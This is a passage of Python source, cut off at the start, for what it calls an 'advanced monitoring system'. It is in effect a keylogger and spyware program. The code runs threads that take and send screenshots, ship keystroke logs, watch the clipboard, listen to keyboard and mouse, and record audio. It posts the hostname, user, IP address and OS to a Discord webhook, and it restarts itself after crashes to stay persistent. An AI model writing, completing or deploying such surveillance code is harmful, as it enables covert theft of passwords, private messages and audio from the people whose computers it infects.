    while True:
        try:
            take_and_send_screenshot()
            time.sleep(SCREENSHOT_INTERVAL)
            last_screenshot_time = time.time()  # Update the time after successful screenshot
        except Exception as e:
            logger.error(f"Error in screenshot thread: {e}")
            # Continue despite errors - watchdog will restart if too many failures
            time.sleep(SCREENSHOT_INTERVAL * 2)  # Wait longer after error

def keylog_sender_thread_function():
    """Thread function for sending key logs periodically."""
    global last_keylog_time
    
    while True:
        try:
            time.sleep(KEYLOG_SEND_INTERVAL)
            send_key_logs()
            last_keylog_time = time.time()  # Update the time after successful send
        except Exception as e:
            logger.error(f"Error in keylog sender thread: {e}")
            # Continue despite errors - watchdog will restart if too many failures
            time.sleep(KEYLOG_SEND_INTERVAL * 0.5)  # Wait but try again sooner

def main():
    """Enhanced main function with error handling and automatic restart."""
    try:
        logger.info("=== ADVANCED MONITORING SYSTEM STARTING ===")
        logger.info(f"System: {platform.system()} {platform.release()} ({platform.version()})")
        logger.info(f"Host: {socket.gethostname()}")
        logger.info(f"User: {os.getlogin()}")
        
        # Register initial startup with Discord
        system_info = get_system_info()
        startup_message = f"""🟢 **MONITORING SYSTEM STARTED**
**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**Hostname:** {system_info['hostname']}
**User:** {system_info['username']}
**OS:** {system_info['os']}
**IP Address:** {system_info['ip']}
**Python Version:** {system_info['python_version']}
**CPU Cores:** {system_info['cpu']['cores']} physical, {system_info['cpu']['threads']} logical
**Total Memory:** {system_info['memory']['total']}
"""
        try:
            requests.post(KEYLOG_WEBHOOK_URL, json={"content": startup_message})
        except Exception as e:
            logger.error(f"Failed to send startup notification: {e}")
        
        # Start the watchdog thread first
        watchdog_thread = threading.Thread(target=watchdog_thread_function, daemon=True)
        watchdog_thread.start()
        logger.info("Watchdog thread started")
        
        # Start the screenshot thread
        screenshot_thread = threading.Thread(target=screenshot_thread_function, daemon=True)
        screenshot_thread.start()
        logger.info("Screenshot thread started")
        
        # Start the keylog sender thread
        keylog_sender_thread = threading.Thread(target=keylog_sender_thread_function, daemon=True)
        keylog_sender_thread.start()
        logger.info("Keylog sender thread started")
        
        # Start the clipboard monitoring thread
        clipboard_thread = threading.Thread(target=clipboard_thread_function, daemon=True)
        clipboard_thread.start()
        logger.info("Clipboard monitoring thread started")
        
        # Start the keyboard and mouse listeners
        keyboard_listener = keyboard.Listener(
            on_press=on_key_press,
            on_release=on_key_release
        )
        keyboard_listener.start()
        logger.info("Keyboard listener started")
        
        # Start the mouse listener
        mouse_listener = mouse.Listener(
            on_click=on_mouse_click,
            on_move=on_mouse_move
        )
        mouse_listener.start()
        logger.info("Mouse listener started")
        
        # Integrate audio recording
        audio_process = integrate_audio_recording()
        
        # Keep the main thread alive and monitor processes
        audio_fail_count = 0
        
        while True:
            # Check if audio process is still running, restart if needed
            if audio_process and audio_process.poll() is not None:
                audio_fail_count += 1
                logger.warning(f"Audio recording process exited (count: {audio_fail_count})")
                
                if audio_fail_count <= 3:  # Limit restart attempts
                    logger.info("Restarting audio recording process")
                    audio_process = integrate_audio_recording()
                else:
                    logger.error("Too many audio recording failures, giving up")
                    audio_process = None
            
            # Make the thread sleep to prevent high CPU usage while checking
            time.sleep(5)
    
    except KeyboardInterrupt:
        logger.info("Keyboard interrupt received. Stopping monitoring.")
        
    except Exception as e:
        error_message = f"Critical error in main function: {e}"
        logger.critical(error_message)
        
        # Send error notification
        try:
            send_error_notification(error_message)
        except:
            pass
            
        if RESTART_ON_ERROR:
            logger.info("Restarting script due to critical error...")
            restart_script()
    
    finally:
        # Try to shut down gracefully
        logger.info("Shutting down monitoring system...")
        # Just exit - daemon threads will terminate automatically

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # Catch-all for absolutely any error
        try:
            logger.critical(f"Fatal error: {e}")
            traceback.print_exc()
            
            # Last-ditch effort to notify
            try:
                send_error_notification(f"Fatal error in main block: {e}")
            except:
                pass
                
            if RESTART_ON_ERROR:
                time.sleep(5)  # Wait a few seconds before restart
                restart_script()
        except:
            # If even the error handling fails, try a bare-bones restart
            try:
                subprocess.Popen([sys.executable, os.path.abspath(__file__)])
                sys.exit(1)
            except:
                pass
